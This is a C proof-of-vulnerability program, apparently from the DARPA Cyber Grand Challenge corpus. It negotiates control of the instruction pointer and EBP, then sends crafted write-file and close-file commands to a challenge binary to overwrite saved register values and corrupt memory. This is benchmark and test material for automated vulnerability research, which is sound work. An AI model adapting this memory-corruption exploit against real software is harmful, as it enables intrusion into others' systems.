/*

Author: Jason Williams <jdw@cromulence.com>

Copyright (c) 2015 Cromulence LLC

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in
all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
THE SOFTWARE.

*/
#include "libpov.h"

int cgc_IsHexChar( char val )
{
	if ( val >= 'a' && val <= 'f' )
		return (1);
	else if ( val >= 'A' && val <= 'F' )
		return (1);
	else if ( val >= '0' && val <= '9' )
		return (1);
	else
		return (0);
}

uint8_t cgc_HexCharToInt( char val )
{
	if ( val >= 'a' && val <= 'f' )
		return (10 + (val-'a'));
	else if ( val >= 'A' && val <= 'F' )
		return (10 + (val-'A'));
	else if ( val >= '0' && val <= '9' )
		return (0 + (val-'0'));
	else
		return (0);
}

cgc_size_t cgc_ReadBytes( int fd, char *buf, cgc_size_t len ) 
{
	cgc_size_t total_bytes = 0;
	cgc_size_t rx_bytes;
	char c;
				        
	while (total_bytes < len) 
	{
		if (cgc_receive(fd, &c, 1, &rx_bytes) != 0) 
                	return(0);
								                
		if (rx_bytes == 0) 
			return (0);

		buf[total_bytes++] = c;
	}

	return(total_bytes);
}

cgc_size_t cgc_RecvUntil(int fd, char delim, char *buf, cgc_size_t maxlen) 
{
	cgc_size_t total_bytes = 0;
	cgc_size_t rx_bytes = 0;
	char c;

	while ( total_bytes < maxlen-1 )
	{
		if ( cgc_receive( fd, &c, 1, &rx_bytes ) != 0 )
			return (0);

		if ( rx_bytes == 0 )
			return (0);

		if ( c == delim )
			break;

		buf[total_bytes++] = c;
	}

	buf[total_bytes] = '\0';

	return (total_bytes);
}

cgc_size_t cgc_SendBytes(int fd, char *buf, cgc_size_t len) 
{
	cgc_size_t tx_bytes;
	cgc_size_t total_bytes = 0;

	while ( total_bytes < len )
	{
		if ( cgc_transmit( fd, buf+total_bytes, 1, &tx_bytes ) != 0 )
			return (0);

		if ( tx_bytes != 1 )
			return (0);

		total_bytes++;
	}

	return(total_bytes);
}

void cgc_NegotiateType2Pov(unsigned int *type2_addr, unsigned int *type2_size, unsigned int *type2_length) 
{
	unsigned int PovType = 2;
	
	// Request Type 2 negotitation
	if (cgc_SendBytes(3, (char *)&PovType, 4) != 4)
		cgc__terminate(-1);

	// get the 4-byte value for type2_addr
	if (cgc_ReadBytes(3, (char *)type2_addr, 4) != 4)
		cgc__terminate(-1);

	// get the 4-byte size for type_size
	if (cgc_ReadBytes(3, (char *)type2_size, 4) != 4)
		cgc__terminate(-1);
			
	// get the 4-byte value for type2_length
	if (cgc_ReadBytes(3, (char *)type2_length, 4) != 4)
		cgc__terminate(-1);

}

void cgc_SendLine( int fd, const char *pszLine )
{
	cgc_size_t line_len = cgc_strlen( pszLine );

	cgc_SendBytes( fd, (char *)pszLine, line_len );
}	

void cgc_SendCommand( const char *pszCommandData )
{
	cgc_size_t command_len = cgc_strlen( pszCommandData );

	cgc_SendBytes( 1, (char *)pszCommandData, command_len );
}

void cgc_NegotiateType1Pov(unsigned int ipmask, unsigned int regmask, unsigned int regnum, unsigned int *type1_ip, unsigned int *type1_reg) 
{
        unsigned int PovType = 1;

	// Request Type 1 negotitation
	if ( cgc_SendBytes(3, (char *)&PovType, 4) != 4 )
		cgc__terminate(-1);
	
	 // Send the ipmask
	 if ( cgc_SendBytes(3, (char *)&ipmask, 4) != 4 )
		 cgc__terminate(-1);

	 // Send the regmask
	 if ( cgc_SendBytes(3, (char *)&regmask, 4) != 4)
		 cgc__terminate(-1);
	 
	 // Send the register number we'll be controlling
	if ( cgc_SendBytes(3, (char *)&regnum, 4) != 4 )
		cgc__terminate(-1);

	// get the 4-byte value for eip
	if ( cgc_ReadBytes(3, (char *)type1_ip, 4) != 4)
		cgc__terminate(-1);
 
	// get the 4-byte value for the register
	if (cgc_ReadBytes(3, (char *)type1_reg, 4) != 4)
		cgc__terminate(-1);
 
	return;
}

void cgc_ConsumeLines( cgc_size_t lineCount )
{
	char szMaxLineLen[2048];

	// Limitation -- only 2048 bytes until line is cgc_read!
	for ( cgc_size_t count = 0; count < lineCount; count++ )
		cgc_RecvUntil( 0, '\n', szMaxLineLen, 2048 );
}


typedef struct CLOSE_FILE_COMMAND
{
	uint8_t commandNum;
	uint32_t fd;
} __attribute__((packed)) tCloseFileCommand;

typedef struct OPEN_FILE_COMMAND
{
	uint8_t commandNum;
	uint8_t fileNameLen;
	uint8_t openMode;
} __attribute__((packed)) tOpenFileCommand;

typedef struct DELETE_FILE_COMMAND
{
	uint8_t commandNum;
	uint8_t fileNameLen;
} __attribute__((packed)) tDeleteFileCommand;

typedef struct WRITE_FILE_COMMAND
{
	uint8_t commandNum;
	int32_t fd;
	uint32_t dataLen;
} __attribute__((packed)) tWriteFileCommand;

#define OPEN_FILE_COMMAND	(0)
#define CLOSE_FILE_COMMAND	(1)
#define WRITE_FILE_COMMAND	(2)
#define READ_FILE_COMMAND	(3)
#define DELETE_FILE_COMMAND	(4)

#define EAX_REG_NUM	(0)
#define ECX_REG_NUM	(1)
#define EDX_REG_NUM	(2)
#define EBX_REG_NUM	(3)
#define ESP_REG_NUM	(4)
#define EBP_REG_NUM	(5)
#define ESI_REG_NUM	(6)
#define EDI_REG_NUM	(7)
int main(int cgc_argc, char *cgc_argv[]) 
{
	// ipmask -- mask of CB/RB instruction pointer
	// regmask -- mask of CB/RB register (specified by third argument)
	// 0 - eax, 1 - ecx, 2 - edx, 3 - ebx, 4 - esp, 5 - ebp, 6 - esi, 7 - edi
   
	char szReadBuf[256];

	unsigned int type1_ip;
	unsigned int type1_reg;
	cgc_NegotiateType1Pov( 0xfefefefe, 0xfefefefe, EBP_REG_NUM, &type1_ip, &type1_reg );

	cgc_ConsumeLines( 1 );

	tWriteFileCommand oWriteFileCmd;
	oWriteFileCmd.commandNum = WRITE_FILE_COMMAND;
	oWriteFileCmd.fd = 0;
	oWriteFileCmd.dataLen = 0x100;

	uint8_t tempBuffer[256];
	for ( uint32_t i = 0; i < 256; i++ )
		tempBuffer[i] = i;

	*((uint32_t*)(tempBuffer+0x8)) = type1_ip;
	*((uint32_t*)(tempBuffer+0x4)) = type1_reg;

	cgc_SendBytes( STDOUT, (char *)&oWriteFileCmd, sizeof(oWriteFileCmd) );
	cgc_SendBytes( STDOUT, (char *)tempBuffer, 256 );

	/*	
	tDeleteFileCommand oDeleteCmd;
	oDeleteCmd.commandNum = DELETE_FILE_COMMAND;
	oDeleteCmd.fileNameLen = 0x10;

	SendBytes( STDOUT, (char *)&oDeleteCmd, sizeof(oDeleteCmd) );
	SendBytes( STDOUT, "ABCDAABB01234567", 0x10 );

	tOpenFileCommand oOpenCmd;
	oOpenCmd.commandNum = OPEN_FILE_COMMAND;
	oOpenCmd.fileNameLen = 0x10;
	oOpenCmd.openMode = 0xC0;

	SendBytes( STDOUT, (char *)&oOpenCmd, sizeof(oOpenCmd) );
	SendBytes( STDOUT, "AAAABBBBCCCCDDDD", 0x10 );
	*/

	tCloseFileCommand oCloseCmd;
	oCloseCmd.commandNum = CLOSE_FILE_COMMAND;
	oCloseCmd.fd = (0xBFFFFF62-0x1ad);

	cgc_SendBytes( STDOUT, (char *)&oCloseCmd, sizeof(oCloseCmd) );

	uint8_t endSimCommand = 5;
	cgc_SendBytes( STDOUT, (char *)&endSimCommand, sizeof(endSimCommand) );

	cgc_ConsumeLines( 1 );

	return (0);
}
